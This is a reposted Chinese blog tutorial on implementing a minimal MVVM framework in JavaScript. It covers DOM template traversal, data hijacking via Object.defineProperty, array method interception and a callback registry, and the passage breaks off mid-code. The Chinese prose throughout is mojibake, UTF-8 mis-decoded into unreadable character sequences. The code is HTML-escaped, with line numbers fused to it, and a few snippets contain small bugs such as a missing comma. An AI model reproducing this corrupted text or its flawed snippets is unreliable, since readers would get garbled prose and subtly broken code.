    <content type="text"><![CDATA[è½¬è½½è‡ªæ˜é‡‘ç½‘ç»œï¼ŒåŸæ–‡é“¾æ¥ï¼šhttps://saul-mirone.github.io/2016/12/19/simple-mvvm/ ä»€ä¹ˆæ˜¯MVVMï¼ŸMVVMæ˜¯ä¸€ç§ç¨‹åºæ¶æ„è®¾è®¡ã€‚æŠŠå®ƒæ‹†å¼€æ¥çœ‹åº”è¯¥æ˜¯Model-View-ViewModelã€‚ ModelModelæŒ‡çš„æ˜¯æ•°æ®å±‚ï¼Œæ˜¯çº¯å‡€çš„æ•°æ®ã€‚å¯¹äºå‰ç«¯æ¥è¯´ï¼Œå®ƒå¾€å¾€æ˜¯ä¸€ä¸ªç®€å•çš„å¯¹è±¡ã€‚ä¾‹å¦‚ï¼š 123456789&#123; name: &apos;mirone&apos;, age: 20, friends: [&apos;singleDogA&apos;, &apos;singleDogB&apos;], details: &#123; type: &apos;notSingleDog&apos;, tags: [&apos;fff&apos;, &apos;sox&apos;] &#125;&#125; æ•°æ®å±‚æ˜¯æˆ‘ä»¬éœ€è¦æ¸²æŸ“åå‘ˆç°ç»™ç”¨æˆ·çš„æ•°æ®ï¼Œæ•°æ®å±‚æœ¬èº«æ˜¯å¯å˜çš„ã€‚æ•°æ®å±‚ä¸åº”è¯¥æ‰¿æ‹…é€»è¾‘æ“ä½œå’Œè®¡ç®—çš„åŠŸèƒ½ã€‚ ViewViewæŒ‡è§†å›¾å±‚ï¼Œæ˜¯ç›´æ¥å‘ˆç°ç»™ç”¨æˆ·çš„éƒ¨åˆ†ï¼Œç®€å•çš„æ¥è¯´ï¼Œå¯¹äºå‰ç«¯å°±æ˜¯HTMLã€‚ä¾‹å¦‚ä¸Šé¢çš„æ•°æ®å±‚ï¼Œå®ƒå¯¹åº”çš„è§†å›¾å±‚å¯èƒ½æ˜¯ï¼š 123456789101112131415161718192021&lt;div&gt; &lt;p&gt; &lt;b&gt;name: &lt;/b&gt; &lt;span&gt;mirone&lt;/span&gt; &lt;/p&gt; &lt;p&gt; &lt;b&gt;age: &lt;/b&gt; &lt;span&gt;20&lt;/span&gt; &lt;/p&gt; &lt;ul&gt; &lt;li&gt;singleDogA&lt;/li&gt; &lt;li&gt;singleDogB&lt;/li&gt; &lt;/ul&gt; &lt;div&gt; &lt;p&gt;notSingleDog&lt;/p&gt; &lt;ul&gt; &lt;li&gt;fff&lt;/li&gt; &lt;li&gt;sox&lt;/li&gt; &lt;/ul&gt; &lt;/div&gt;&lt;/div&gt; å½“ç„¶è§†å›¾å±‚æ˜¯å¯å˜çš„ï¼Œä½ å®Œå…¨å¯ä»¥åœ¨å…¶ä¸­éšæ„æ·»åŠ å…ƒç´ ã€‚è¿™ä¸ä¼šæ”¹å˜æ•°æ®å±‚ï¼Œåªä¼šæ”¹å˜è§†å›¾å±‚å‘ˆç°æ•°æ®çš„æ–¹å¼ã€‚è§†å›¾å±‚åº”è¯¥å’Œæ•°æ®å±‚å®Œå…¨åˆ†ç¦»ã€‚ ViewModelæ—¢ç„¶è§†å›¾å±‚åº”è¯¥å’Œæ•°æ®å±‚åˆ†ç¦»ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±éœ€è¦è®¾è®¡ä¸€ç§ç»“æ„ï¼Œè®©å®ƒä»¬å»ºç«‹èµ·æŸç§è”ç³»ã€‚å½“æˆ‘ä»¬å¯¹Modelè¿›è¡Œä¿®æ”¹çš„æ—¶å€™ï¼ŒViewModelå°±ä¼šæŠŠä¿®æ”¹è‡ªåŠ¨åŒæ­¥åˆ°Viewå±‚å»ã€‚åŒæ ·å½“æˆ‘ä»¬ä¿®æ”¹Viewï¼ŒModelåŒæ ·è¢«ViewModelè‡ªåŠ¨ä¿®æ”¹ã€‚ å¯ä»¥çœ‹å‡ºï¼Œå¦‚ä½•è®¾è®¡èƒ½å¤Ÿé«˜æ•ˆè‡ªåŠ¨åŒæ­¥Viewä¸Modelçš„ViewModelæ˜¯æ•´ä¸ªMVVMæ¡†æ¶çš„æ ¸å¿ƒå’Œéš¾ç‚¹ã€‚ MVVMçš„åŸç†å·®å¼‚ä¸åŒçš„æ¡†æ¶å¯¹äºMVVMçš„å®ç°æ˜¯ä¸åŒçš„ã€‚ æ•°æ®åŠ«æŒVueçš„å®ç°æ–¹å¼ï¼Œå¯¹æ•°æ®ï¼ˆModelï¼‰è¿›è¡ŒåŠ«æŒï¼Œå½“æ•°æ®å‘ç”Ÿå˜åŠ¨æ—¶ï¼Œæ•°æ®ä¼šè§¦å‘åŠ«æŒæ—¶ç»‘å®šçš„æ–¹æ³•ï¼Œå¯¹è§†å›¾è¿›è¡Œæ›´æ–°ã€‚ è„æ£€æŸ¥æœºåˆ¶Angularçš„å®ç°æ–¹å¼ï¼Œå½“å‘ç”Ÿäº†æŸç§äº‹ä»¶ï¼ˆä¾‹å¦‚è¾“å…¥ï¼‰ï¼ŒAngularä¼šæ£€æŸ¥æ–°çš„æ•°æ®ç»“æ„å’Œä¹‹å‰çš„æ•°æ®ç»“æ„æ˜¯å¦å‘ç”Ÿäº†å˜åŠ¨ï¼Œæ¥å†³å®šæ˜¯å¦æ›´æ–°è§†å›¾ã€‚ å‘å¸ƒè®¢é˜…æ¨¡å¼Knockoutçš„å®ç°æ–¹å¼ï¼Œå®ç°äº†ä¸€ä¸ªå‘å¸ƒè®¢é˜…å™¨ï¼Œè§£ææ—¶ä¼šåœ¨å¯¹åº”è§†å›¾èŠ‚ç‚¹ç»‘å®šè®¢é˜…å™¨ï¼Œè€Œåœ¨æ•°æ®ä¸Šç»‘å®šå‘å¸ƒå™¨ï¼Œå½“ä¿®æ”¹æ•°æ®æ—¶ï¼Œå°±å‡ºå‘äº†å‘å¸ƒå™¨ï¼Œè§†å›¾æ”¶åˆ°åè¿›è¡Œå¯¹åº”æ›´æ–°ã€‚ ç›¸åŒç‚¹ä½†æ˜¯è¿˜æ˜¯æœ‰å¾ˆå¤šç›¸åŒç‚¹çš„ï¼Œå®ƒä»¬éƒ½æœ‰ä¸‰ä¸ªæ­¥éª¤ï¼š è§£ææ¨¡ç‰ˆ è§£ææ•°æ® ç»‘å®šæ¨¡ç‰ˆä¸æ•°æ® è§£ææ¨¡ç‰ˆä½•è°“æ¨¡ç‰ˆï¼Ÿæˆ‘ä»¬å¯ä»¥çœ‹ä¸€ä¸‹ä¸»æµMVVMçš„APIï¼š 12345678910111213141516171819202122232425&lt;!-- Vue --&gt;&lt;div id=&quot;mobile-list&quot;&gt; &lt;h1 v-text=&quot;title&quot;&gt;&lt;/h1&gt; &lt;ul&gt; &lt;li v-for=&quot;item in brands&quot;&gt; &lt;b v-text=&quot;item.name&quot;&gt;&lt;/b&gt; &lt;span v-show=&quot;showRank&quot;&gt;Rank: &#123;&#123;item.rank&#125;&#125;&lt;/span&gt; &lt;/li&gt; &lt;/ul&gt;&lt;/div&gt;&lt;!-- Angular --&gt;&lt;ul&gt; &lt;li ng-repeat=&quot;phone in phones&quot;&gt; &#123;&#123;phone.name&#125;&#125; &lt;p&gt;&#123;&#123;phone.snippet&#125;&#125;&lt;/p&gt; &lt;/li&gt;&lt;/ul&gt;&lt;!-- Knockout --&gt;&lt;tbody data-bind=&quot;foreach: seats&quot;&gt; &lt;tr&gt; &lt;td data-bind=&quot;text: name&quot;&gt;&lt;/td&gt; &lt;td data-bind=&quot;text: meal().mealName&quot;&gt;&lt;/td&gt; &lt;td data-bind=&quot;text: meal().price&quot;&gt;&lt;/td&gt; &lt;/tr&gt; &lt;/tbody&gt; å¯ä»¥çœ‹åˆ°å®ƒä»¬éƒ½å®šä¹‰äº†è‡ªå·±çš„æ¨¡ç‰ˆå…³é”®å­—ï¼Œè¿™ä¸€æ¨¡å—çš„ä½œç”¨å°±æ˜¯æ ¹æ®è¿™äº›å…³é”®å­—è§£ææ¨¡ç‰ˆï¼Œå°†æ¨¡ç‰ˆå¯¹åº”åˆ°æœŸæœ›çš„æ•°æ®ç»“æ„ã€‚ è§£ææ•°æ®Modelä¸­çš„æ•°æ®ç»è¿‡åŠ«æŒæˆ–ç»‘å®šå‘å¸ƒå™¨æ¥è§£æã€‚æ•°æ®è§£æå™¨çš„ç¼–å†™è¦è€ƒè™‘VMçš„å®ç°æ–¹å¼ï¼Œä½†æ˜¯æ— è®ºå¦‚ä½•è§£ææ•°æ®åªè¦åšå¥½ä¸€ä»¶äº‹ï¼šå®šä¹‰æ•°æ®å˜åŠ¨æ—¶è¦é€šçŸ¥çš„å¯¹è±¡ã€‚è§£ææ•°æ®æ—¶åº”ä¿è¯æ•°æ®è§£æåçš„ä¸€è‡´æ€§ï¼Œå¯¹äºæ¯ç§æ•°æ®è§£æåæš´éœ²çš„æ¥å£åº”è¯¥ä¿æŒä¸€è‡´ã€‚ ç»‘å®šæ¨¡ç‰ˆä¸æ•°æ®è¿™ä¸€éƒ¨åˆ†å®šä¹‰äº†æ•°æ®ç»“æ„ä»¥ä½•ç§æ–¹å¼å’Œæ¨¡ç‰ˆè¿›è¡Œç»‘å®šï¼Œå°±æ˜¯ä¼ è¯´ä¸­çš„â€œåŒå‘ç»‘å®šâ€ã€‚ç»‘å®šä¹‹åæˆ‘ä»¬ç›´æ¥å¯¹æ•°æ®è¿›è¡Œæ“ä½œæ—¶ï¼Œåº”ç”¨å°±èƒ½è‡ªåŠ¨æ›´æ–°è§†å›¾äº†ã€‚æ•°æ®å’Œæ¨¡ç‰ˆå¾€å¾€æ˜¯å¤šå¯¹å¤šçš„å…³ç³»ï¼Œè€Œä¸”ä¸åŒçš„æ¨¡ç‰ˆæ›´æ–°æ•°æ®çš„æ–¹å¼å¾€å¾€ä¸åŒã€‚ä¾‹å¦‚æœ‰çš„æ˜¯æ”¹å˜æ ‡ç­¾çš„æ–‡æœ¬èŠ‚ç‚¹ï¼Œæœ‰çš„æ˜¯æ”¹å˜æ ‡ç­¾çš„classNameã€‚ åŠ¨æ‰‹å®ç°MVVMç»è¿‡ä¸€ç•ªåˆ†æï¼Œæ¥åŠ¨æ‰‹å®ç°MVVMå§ã€‚ æœŸæœ›æ•ˆæœå¯¹äºæˆ‘çš„MVVMï¼Œæˆ‘å¸Œæœ›å¯¹åº”ä¸€ä¸ªæ•°æ®ç»“æ„ï¼š 1234567891011121314151617let data = &#123; title: &apos;todo list&apos;, user: &apos;mirone&apos;, todos: [ &#123; creator: &apos;mirone&apos;, content: &apos;write mvvm&apos; done: &apos;undone&apos;, date: &apos;2016-11-17&apos;, members: [ &#123; name: &apos;kaito&apos; &#125; ] &#125; ]&#125; æˆ‘å¯ä»¥å¯¹åº”çš„ç¼–å†™æ¨¡ç‰ˆï¼š 123456789101112131415161718&lt;div id=&quot;root&quot;&gt; &lt;h1 data-model=&quot;title&quot;&gt;&lt;/h1&gt; &lt;div&gt; &lt;div data-model=&quot;user&quot;&gt;&lt;/div&gt; &lt;ul data-list=&quot;todos&quot;&gt; &lt;li data-list-item=&quot;todos&quot;&gt; &lt;p data-class=&quot;todos:done&quot; data-model=&quot;todos:creator&quot;&gt;&lt;/p&gt; &lt;p data-model=&quot;todos:date&quot;&gt;&lt;/p&gt; &lt;p data-model=&quot;todos:content&quot;&gt;&lt;/p&gt; &lt;ul data-list=&quot;todos:members&quot;&gt; &lt;li data-list-item=&quot;todos:members&quot;&gt; &lt;span data-model=&quot;todos:members:name&quot;&gt;&lt;/span&gt; &lt;/li&gt; &lt;/ul&gt; &lt;/li&gt; &lt;/ul&gt; &lt;/div&gt;&lt;/div&gt; ç„¶åé€šè¿‡è°ƒç”¨ï¼š 1new Parser(&apos;#root&apos;, data) å°±å¯ä»¥å®Œæˆmvvmçš„ç»‘å®šï¼Œä¹‹åå¯ä»¥ç›´æ¥æ“ä½œdataå¯¹è±¡æ¥å¯¹Viewè¿›è¡Œæ›´æ”¹ã€‚ è§£ææ¨¡ç‰ˆæ¨¡ç‰ˆçš„è§£æå…¶å®æ˜¯ä¸€ä¸ªæ ‘çš„éå†è¿‡ç¨‹ã€‚ éå†ä¼—æ‰€å‘¨çŸ¥ï¼ŒDOMæ˜¯ä¸€ä¸ªæ ‘çŠ¶ç»“æ„ï¼Œè¿™ä¹Ÿæ˜¯ä¸ºä»€ä¹ˆå®ƒè¢«ç§°ä¸ºâ€œDOMæ ‘â€ã€‚ å¯¹äºæ ‘çš„éå†ï¼Œåªè¦é€’å½’ï¼Œä¾¿èƒ½å¾ˆè½»æ¾çš„å®Œæˆä¸€ä¸ªæ·±åº¦ä¼˜å…ˆéå†ï¼Œè¯·çœ‹ä»£ç ï¼š 12345678910function scan(node) &#123; console.log(node) for(let i = 0; i &lt; node.children.length; i++) &#123; const _thisNode = node.children[i] console.log(_thisNode) if(_thisNode.children.length) &#123; scan(_thisNode) &#125; &#125;&#125; è¿™ä¸ªå‡½æ•°éå†äº†ä¸€ä¸ªDOMèŠ‚ç‚¹ï¼Œä¾æ¬¡æ‰“å°éå†å¾—åˆ°çš„èŠ‚ç‚¹ã€‚ éå†ä¸åŒç»“æ„çŸ¥é“äº†å¦‚ä½•éå†ä¸€ä¸ªDOMæ ‘ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¦‚ä½•è·å–éœ€è¦åˆ†æçš„DOMæ ‘ï¼Ÿ æ ¹æ®ä¹‹å‰çš„æ„æƒ³ï¼Œæˆ‘ä»¬éœ€è¦è¿™ä¹ˆå‡ ç§æ ‡è¯†ï¼š - data-modelâ€”â€”ç”¨äºå°†DOMçš„æ–‡æœ¬èŠ‚ç‚¹æ›¿æ¢ä¸ºåˆ¶å®šå†…å®¹ - data-classâ€”â€”ç”¨äºå°† DOMçš„classNameæ›¿æ¢ä¸ºåˆ¶å®šå†…å®¹ - data-listâ€”â€”ç”¨äºæ ‡è¯†æ¥ä¸‹æ¥å°†å‡ºç°ä¸€ä¸ªåˆ—è¡¨ï¼Œåˆ—è¡¨ä¸ºåˆ¶å®šç»“æ„ - data-list-itemâ€”â€”ç”¨äºæ ‡è¯†åˆ—è¡¨é¡¹çš„å†…éƒ¨ç»“æ„ - data-eventâ€”â€”ç”¨äºä¸ºDOMèŠ‚ç‚¹ç»‘å®šæŒ‡å®šäº‹ä»¶ ç®€å•çš„å½’ç±»ä¸€ä¸‹ï¼šdata-modelã€data-classå’Œdata-eventåº”è¯¥æ˜¯ä¸€ç±»ï¼Œå®ƒä»¬éƒ½åªå½±å“å½“å‰èŠ‚ç‚¹ï¼›è€Œdata-listå’Œdata-itemä½œä¸ºåˆ—è¡¨åº”è¯¥è¦å•ç‹¬è€ƒè™‘ã€‚é‚£ä¹ˆæˆ‘ä»¬å¯ä»¥è¿™æ ·éå†ï¼š 123456789101112131415161718192021222324252627function scan(node) &#123; if(!node.getAttribute(&apos;data-list&apos;)) &#123; for(let i = 0; i &lt; node.children.length; i++) &#123; const _thisNode = node.children[i] parseModel(node) parseClass(node) parseEvent(node) if(_thisNode.children.length) &#123; scan(_thisNode) &#125; &#125; &#125; else &#123; parseList(node) &#125;&#125;function parseModel(node) &#123; //TODO:è§£æModelèŠ‚ç‚¹&#125;function parseClass(node) &#123; //TODO:è§£æclassName&#125;function parseEvent(node) &#123; //TODO:è§£æäº‹ä»¶&#125;function parseList(node) &#123; //TODO: è§£æåˆ—è¡¨&#125; è¿™æ ·æˆ‘ä»¬å°±æ­å¥½äº†éå†å™¨çš„å¤§æ¦‚æ¡†æ¶ ä¸åŒç»“æ„çš„å¤„ç†æ–¹æ³•parseModelï¼ŒparseClasså’ŒparseEventçš„å¤„ç†æ–¹å¼æ¯”è¾ƒç›¸ä¼¼ï¼Œå”¯ä¸€å€¼å¾—æ³¨æ„çš„å°±æ˜¯å¯¹äºåµŒå¥—å…ƒç´ çš„å¤„ç†ï¼Œå›å¿†ä¸€ä¸‹æˆ‘ä»¬çš„æ¨¡ç‰ˆè®¾è®¡ï¼š 12&lt;!--é‡åˆ°åµŒå¥—éƒ¨åˆ†--&gt;&lt;div data-model=&quot;todos:date&quot;&gt;&lt;/div&gt; è¿™é‡Œçš„todos:dateå…¶å®å¤§å¤§æ–¹ä¾¿äº†æˆ‘ä»¬è§£ææ¨¡ç‰ˆï¼Œå› ä¸ºå®ƒå±•ç¤ºäº†å½“å‰æ•°æ®åœ¨Modelç»“æ„ä¸­çš„ä½ç½®ã€‚ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657//eventè¦æœ‰ä¸€ä¸ªeventList,å¤§æ¦‚ç»“æ„ä¸ºï¼šconst eventList = &#123; typeWriter: &#123; type: &apos;input&apos;, //äº‹ä»¶çš„ç§ç±» fn: function() &#123; //äº‹ä»¶çš„å¤„ç†å‡½æ•°ï¼Œå‡½æ•°çš„thisä»£è¡¨å‡½æ•°ç»‘å®šçš„DOMèŠ‚ç‚¹ &#125; &#125;&#125;function parseEvent(node) &#123; if(node.getAttribute(&apos;data-event&apos;)) &#123; const eventName = node.getAttribute(&apos;data-event&apos;) node.addEventListener(eventList[eventName].type, eventList[eventName].fn.bind(node)) &#125;&#125;//æ ¹æ®åœ¨æ¨¡ç‰ˆä¸­çš„ä½ç½®è§£ææ¨¡ç‰ˆï¼Œè¿™é‡Œçš„Pathæ˜¯ä¸€ä¸ªæ•°ç»„ï¼Œä»£è¡¨äº†å½“å‰æ•°æ®åœ¨Modelä¸­çš„ä½ç½®function parseData(str, node) &#123; const _list = str.split(&apos;:&apos;) let _data, _path let p = [] _list.forEach((key, index) =&gt; &#123; if(index === 0) &#123; _data = data[key] p.push(key) &#125; else &#123; _path = node.path[index-1] p.push(_path) _data = _data[_path][key] p.push(key) &#125; &#125;) return &#123; path: p, data: _data &#125;&#125;function parseModel(node) &#123; if(node.getAttribute(&apos;data-model&apos;)) &#123; const modelName = node.getAttribute(&apos;data-model&apos;) const _data = parseData(modelName, node) if(node.tagName === &apos;INPUT&apos;) &#123; node.value = _data.data &#125; else &#123; node.innerText = _data.data &#125; &#125;&#125;function parseClass(node) &#123; if(node.getAttribute(&apos;data-class&apos;)) &#123; const className = node.getAttribute(&apos;data-class&apos;) const _data = parseData(className, node) if(!node.classList.contains(_data.data)) &#123; node.classList.add(_data.data) &#125; &#125;&#125; æ¥ä¸‹æ¥è§£æåˆ—è¡¨ï¼Œæˆ‘ä»¬é‡åˆ°åˆ—è¡¨æ—¶ï¼Œåº”è¯¥å…ˆé€’å½’æ‰¾å‡ºåˆ—è¡¨é¡¹çš„ç»“æ„ 1234567891011121314151617181920parseListItem(node) &#123; let target !function getItem(node) &#123; for(let i = 0; i &lt; node.children.length; i++) &#123; const _thisNode = node.children[i] if(node.path) &#123; _thisNode.path = node.path.slice() &#125; parseEvent(_thisNode) parseClass(_thisNode) parseModel(_thisNode) if(_thisNode.getAttribute(&apos;data-list-item&apos;)) &#123; target = _thisNode &#125; else &#123; getItem(_thisNode) &#125; &#125; &#125;(node) return target&#125; ä¹‹ååœ¨ç”¨è¿™ä¸ªåˆ—è¡¨é¡¹æ¥æŒ‰éœ€æ‹·è´å‡ºä¸€å®šæ•°é‡çš„åˆ—è¡¨é¡¹ï¼Œå¹¶å¡«å……æ•°æ® 123456789101112131415161718function parseList(node) &#123; const _item = parseListItem(node) const _list = node.getAttribute(&apos;data-list&apos;) const _listData = parseData(_list, node) _listData.data.forEach((_dataItem, index) =&gt; &#123; const _copyItem = _item.cloneNode(true) if(node.path) &#123; _copyItem.path = node.path.slice() &#125; if(!_copyItem.path) &#123; _copyItem.path = [] &#125; _copyItem.path.push(index) scan(_copyItem) node.insertBefore(_copyItem, _item) &#125;) node.removeChild(_item)&#125; è¿™æ ·æˆ‘ä»¬å°±å®Œæˆäº†æ¨¡ç‰ˆçš„æ¸²æŸ“ï¼Œscanå‡½æ•°ä¼šæ‰«ææ¨¡ç‰ˆå¯¹æ¨¡ç‰ˆè¿›è¡Œæ¸²æŸ“ è§£ææ•°æ®è§£æäº†æ¨¡ç‰ˆä¹‹åï¼Œæˆ‘ä»¬å°±è¦ç ”ç©¶å¦‚ä½•è¿›è¡Œæ•°æ®è§£æäº†ï¼Œè¿™é‡Œæˆ‘é‡‡ç”¨åŠ«æŒæ•°æ®çš„æ–¹æ³•æ¥è¿›è¡Œã€‚ æ™®é€šå¯¹è±¡çš„åŠ«æŒå¦‚ä½•åŠ«æŒæ•°æ®ï¼Ÿä¸€èˆ¬å¯¹æ•°æ®çš„åŠ«æŒéƒ½æ˜¯é€šè¿‡Object.definePropertyæ–¹æ³•è¿›è¡Œçš„ï¼Œå…ˆçœ‹ä¸€ä¸ªå°ä¾‹å­ï¼š 1234567891011121314151617181920212223var obj = &#123; name: &apos;mi&apos;&#125;function observe(obj, key) &#123; let old = obj[key] Object.defineProperty(obj, key, &#123; enumerable: true, configurable: true, get: function() &#123; return old &#125;, set: function(now) &#123; if(now !== old) &#123; console.log(`$&#123;old&#125; ---&gt; $&#123;now&#125;`) old = now &#125; &#125; &#125;)&#125;observe(obj, &apos;name&apos;)obj.name = &apos;mirone&apos;//è¾“å‡ºç»“æœï¼š//&quot;mi ---&gt; mirone&quot; è¿™æ ·æˆ‘ä»¬å°±é€šè¿‡object.definePropertyè¿›è¡Œäº†æ•°æ®åŠ«æŒï¼Œå¦‚æœæˆ‘ä»¬æƒ³è‡ªå®šä¹‰åŠ«æŒæ•°æ®æ—¶å‘ç”Ÿçš„æ“ä½œï¼Œåªè¦æ·»åŠ ä¸€ä¸ªå›è°ƒå‡½æ•°å‚æ•°å³å¯ï¼š 12345678910111213141516function observer(obj, k, callback) &#123; let old = obj[k] Object.defineProperty(obj, k, &#123; enumerable: true, configurable: true, get: function() &#123; return old &#125;, set: function(now) &#123; if(now !== old) &#123; callback(old, now) &#125; old = now &#125; &#125;)&#125; åµŒå¥—å¯¹è±¡çš„åŠ«æŒå¯¹äºå¯¹è±¡ä¸­çš„å¯¹è±¡ï¼Œæˆ‘ä¹ˆè¿˜éœ€è¦å¤šè¿›è¡Œä¸€ä¸ªæ­¥éª¤ï¼Œä½¿ç”¨é€’å½’æ¥åŠ«æŒå¯¹è±¡ä¸­çš„å¯¹è±¡ï¼š 1234567891011121314//å®ç°ä¸€ä¸ªobserveAllKeyå‡½æ•°ï¼ŒåŠ«æŒè¯¥å¯¹è±¡çš„æ‰€æœ‰å±æ€§function observeAllKey(obj, callback) &#123; Object.keys(obj).forEach(function(key)&#123; observer(obj, key, callback) &#125;)&#125;function observer(obj, k, callback) &#123; let old = obj[k] if (old.toString() === &apos;[object Object]&apos;) &#123; observeAllKey(old, callback) &#125; else &#123; //...åŒå‰æ–‡ï¼Œçœç•¥ &#125;&#125; å¯¹è±¡ä¸­æ•°ç»„çš„åŠ«æŒå¯¹äºå¯¹è±¡ä¸­çš„æ•°ç»„ï¼Œæˆ‘ä»¬ä½¿ç”¨é‡å†™æ•°ç»„çš„prototypeçš„æ–¹æ³•æ¥åŠ«æŒå®ƒ 12345678910111213141516171819function observeArray(arr, callback) &#123; const oam = [&apos;push&apos;, &apos;pop&apos;, &apos;shift&apos;, &apos;unshift&apos;, &apos;splice&apos;, &apos;sort&apos;, &apos;reverse&apos;] const arrayProto = Array.prototype const hackProto = Object.create(Array.prototype) oam.forEach(function(method)&#123; Object.defineProperty(hackProto, method, &#123; writable: true, enumerable: true, configurable: true, value: function(...arg) &#123; let old = arr.slice() let now = arrayProto[method].call(this, ...arg) callback(old, this, ...arg) return now &#125;, &#125;) &#125;) arr.__proto__ = hackProto&#125; å†™å®ŒåŠ«æŒæ•°ç»„çš„å‡½æ•°åï¼Œå°†å®ƒæ·»åŠ è¿›ä¸»å‡½æ•°ï¼š 12345678910function observer(obj, k, callback) &#123; let old = obj[k] if(Object.prototype.toString.call(old) === &apos;[object Array]&apos;) &#123; observeArray(old, callback) &#125; else if (old.toString() === &apos;[object Object]&apos;) &#123; observeAllKey(old, callback) &#125; else &#123; //... &#125;&#125; å¤„ç†è·¯å¾„å‚æ•°ä¹‹å‰æˆ‘ä»¬æ‰€æœ‰çš„æ–¹æ³•éƒ½æ˜¯é¢å¯¹å•ä¸ªkeyå€¼çš„ï¼Œå›æƒ³ä¸€ä¸‹æˆ‘ä»¬çš„æ¨¡ç‰ˆï¼Œæœ‰å¾ˆå¤šä¾‹å¦‚todos:todo:memberè¿™æ ·çš„è·¯å¾„ï¼Œæˆ‘ä»¬åº”è¯¥å…è®¸ä¼ å…¥ä¸€ä¸ªè·¯å¾„æ•°ç»„ï¼Œæ ¹æ®è·¯å¾„æ•°ç»„æ¥ç›‘å¬æŒ‡å®šçš„å¯¹è±¡æ•°æ® 123456789101112131415function observePath(obj, path, callback) &#123; let _path = obj let _key path.forEach((p, index) =&gt; &#123; if(parseInt(p) === p) &#123; p = parseInt(p) &#125; if(index &lt; path.length - 1) &#123; _path = _path[p] &#125; else &#123; _key = p &#125; &#125;) observer(_path, _key, callback)&#125; ä¹‹åå†å°†å®ƒæ·»åŠ è¿›ä¸»å‡½æ•°ï¼š 1234567891011121314function observer(obj, k, callback) &#123; if(Object.prototype.toString.call(k) === &apos;[object Array]&apos;) &#123; observePath(obj, k, callback) &#125; else &#123; let old = obj[k] if(Object.prototype.toString.call(old) === &apos;[object Array]&apos;) &#123; observeArray(old, callback) &#125; else if (old.toString() === &apos;[object Object]&apos;) &#123; observeAllKey(old, callback) &#125; else &#123; //... &#125; &#125;&#125; è¿™æ ·ï¼Œæˆ‘ä»¬å°±å®Œæˆäº†ç›‘å¬å‡½æ•°ã€‚ å¤šå¯¹ä¸€ç›‘è§†çš„å®ç°æœ‰å¯èƒ½ç»‘å®šæŸä¸ªæ•°æ®ç»“æ„çš„èŠ‚ç‚¹ä¸æ­¢ä¸€ä¸ªï¼Œæœ‰æ—¶æˆ‘ä»¬éœ€è¦ä¿®æ”¹å®Œæˆæ—¶åŒæ—¶é€šçŸ¥æ‰€æœ‰èŠ‚ç‚¹ï¼Œé‚£ä¹ˆæˆ‘ä»¬è¿˜éœ€è¦ä¸€ä¸ªå•ç‹¬çš„æ¨¡å—è´Ÿè´£é€šçŸ¥æ‰€æœ‰èŠ‚ç‚¹ï¼Œæˆ‘ä»¬ç§°ä¹‹ä¸ºRegisteræ¨¡å—ï¼Œè´Ÿè´£é’ˆå¯¹ä¸åŒæ¨¡å—æ³¨å†Œä¸åŒçš„ä¸€ä¸ªæˆ–å¤šä¸ªå›è°ƒå‡½æ•°ã€‚ ç›‘è§†è€…çš„å®ç°1234567891011121314151617181920212223242526272829303132class Register &#123; constructor() &#123; //å­˜æ”¾æ‰€æœ‰å›è°ƒå¯¹è±¡ï¼Œå›è°ƒå¯¹è±¡ç”±ä¸‰ä¸ªkeyç»„æˆï¼šobj, key, fnï¼Œå…¶ä¸­fnåº”è¯¥æ˜¯ä¸€ä¸ªæ•°ç»„ï¼Œæ”¾ç€æ‰€æœ‰å‘ç”Ÿå˜åŒ–æ—¶è¦æ‰§è¡Œçš„å›è°ƒå‡½æ•° this.routes = [] &#125; //æ·»åŠ ä¸€ä¸ªå›è°ƒ regist(obj, k, fn) &#123; const _i = this.routes.find(function(el) &#123; if((el.key === k || el.key.toString() === k.toString()) &amp;&amp; Object.is(el.obj, obj)) &#123; return el &#125; &#125;) if(_i) &#123; //å¦‚æœå·²ç»å­˜åœ¨è¯¥objå’Œkeyç»„æˆçš„å¯¹è±¡ _i.fn.push(fn) &#125; else &#123; //å¦‚æœå°šä¸å­˜åœ¨ this.routes.push(&#123; obj: obj, key: k, fn: [fn] &#125;) &#125; &#125; //è§£æç»“æŸæ—¶è°ƒç”¨ï¼Œç»‘å®šæ‰€æœ‰å›è°ƒ build() &#123; this.routes.forEach((route) =&gt; &#123; observer(route.obj, route.key, route.fn) &#125;) &#125;&#125; observeræ¨¡å—çš„ä¿®æ”¹ç”±äºç°åœ¨ä¸€ä¸ªkeyå¯èƒ½å¯¹åº”å¤šä¸ªå›è°ƒæ“ä½œäº†ï¼Œéœ€è¦å¯¹observerè¿›è¡Œä¿®æ”¹ï¼š 123456789101112131415function observer(obj, k, callback) &#123; //...ä¸å‰æ–‡ç›¸åŒ if(now !== old) &#123; callback.forEach((fn) =&gt; &#123; fn(old, now) &#125;) &#125;&#125;function observerArray(arr, callback) &#123; //...ä¸å‰æ–‡ç›¸åŒ //å°†åŸæ¥çš„callback(old, this, ...arg)æ›¿æ¢ä¸º callback.forEach((fn) =&gt; &#123; fn(old, this, ...arg) &#125;)&#125; ç»‘å®šæ¨¡ç‰ˆä¸æ•°æ®ç°åœ¨ï¼Œæˆ‘ä»¬è¦åœ¨è§£æè¿‡ç¨‹ä¸­æ·»åŠ å¯¹æ•°æ®çš„ç›‘è§†äº†ï¼Œè¿˜è®°å¾—ä¹‹å‰çš„parseç³»åˆ—å‡½æ•°å—ï¼Ÿ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051const register = new Register()function parseModel(node) &#123; if(node.getAttribute(&apos;data-model&apos;)) &#123; //...ä¹‹å‰é€»è¾‘ä¸å˜ register.regist(data, _data.path, function(old, now) &#123; if(node.tagName === &apos;INPUT&apos;) &#123; node.value = now &#125; else &#123; node.innerText = now &#125; //æ·»åŠ consoleä¾¿äºè°ƒè¯• console.log(`$&#123;old&#125; ---&gt; $&#123;now&#125;`) &#125;) &#125;&#125;function parseClass(node) &#123; if(node.getAttribute(&apos;data-class&apos;)) &#123; //... register.regist(data, _data.path, function(old, now) &#123; node.classList.remove(old) node.classList.add(now) console.log(`$&#123;old&#125; ---&gt; $&#123;now&#125;`) &#125;) &#125;&#125;//å½“åˆ—è¡¨å‘ç”Ÿå˜åŒ–æ—¶ï¼Œä¸ºäº†ç®€å•ç›´æ¥é‡æ–°æ¸²æŸ“äº†å½“å‰åˆ—è¡¨function parseList(node) &#123; //... register.regist(data, _listData.path, () =&gt; &#123; while(node.firstChild) &#123; node.removeChild(node.firstChild) &#125; const 